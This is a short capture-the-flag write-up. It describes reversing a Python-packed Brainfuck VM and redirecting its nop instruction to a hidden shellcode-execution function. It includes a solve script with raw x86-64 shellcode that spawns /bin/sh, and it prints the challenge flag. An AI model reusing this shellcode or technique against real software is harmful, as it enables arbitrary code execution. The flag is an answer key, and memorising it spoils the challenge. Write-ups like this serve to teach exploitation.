# Aall

We're given a python file which writes some data to a file then extacts a python program from b64 and runs it. After a lot of analysis and removing unicode chars,

I realised it's a VM interpreter.

Doing some more reversing of the program showed me it was a simple Brainfuck interpreter, with &gt; &lt; - + and ? \(nop\).

There's also a function \(unused\) to essentially execute shellcode.

The problem was then to simply overwrite the instruction for the 'nop' to the shellcode instruction,

and write shellcode in using brainfuck to modify the existing stack.

```python
sc = b"\x90\x90\x6A\x42\x58\xFE\xC4\x48\x99\x52\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5E\x49\x89\xD0\x49\x89\xD2\x0F\x05"
actual_nums = [5, 0, 1, 0, 138, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 104, 116, 116, 112, 115, 58, 47, 47, 97, 97, 114, 111, 110, 101, 115, 97, 117, 46, 99, 111, 109, 47, 102, 105, 108, 101, 115, 47]
goal_nums = [0x25]
goal_nums.extend(list(sc))
print(list(zip(actual_nums,goal_nums)))
print('<'*(1469-1398),end='')
for a,g in zip(actual_nums,goal_nums):
    if a < g:
        print('+'*(g-a),end='')
    if a > g:
        print('-'*(a-g),end='')
    print('>',end='')
```

## flag{b1ng0!\_obl1g4t0ry-sh1tty-cust0m\_4rch\_ch4l-ftw}

